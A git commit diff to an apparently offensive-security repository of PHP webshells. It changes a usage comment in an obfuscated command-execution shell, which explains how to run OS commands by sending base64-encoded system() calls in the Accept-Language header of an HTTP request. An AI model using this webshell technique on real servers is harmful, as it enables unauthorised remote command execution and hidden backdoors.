18fe1ed1825b40a8fde579d7901c5b19d4e47e7d
Jean-Francois-C <61638766+Jean-Francois-C@users.noreply.github.com>
2024-01-05 01:59:54 +0100

    Update

--- webshells/PHP/obfuscatedcmd1.php
+++ webshells/PHP/obfuscatedcmd1.php
@@ -4,7 +4,7 @@
 Usage: Example of an HTTP GET request to send to execute the OS command 'uname -a' by adding in the request HTTP header "Accept-Language" 
 the base64 encoded version of the string: system('uname -a');
 
-GET /path/to/simpleobfuscatedcmd.php HTTP/1.1
+GET /path/to/obfuscatedcmd.php HTTP/1.1
 Host: 192.168.1.101
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
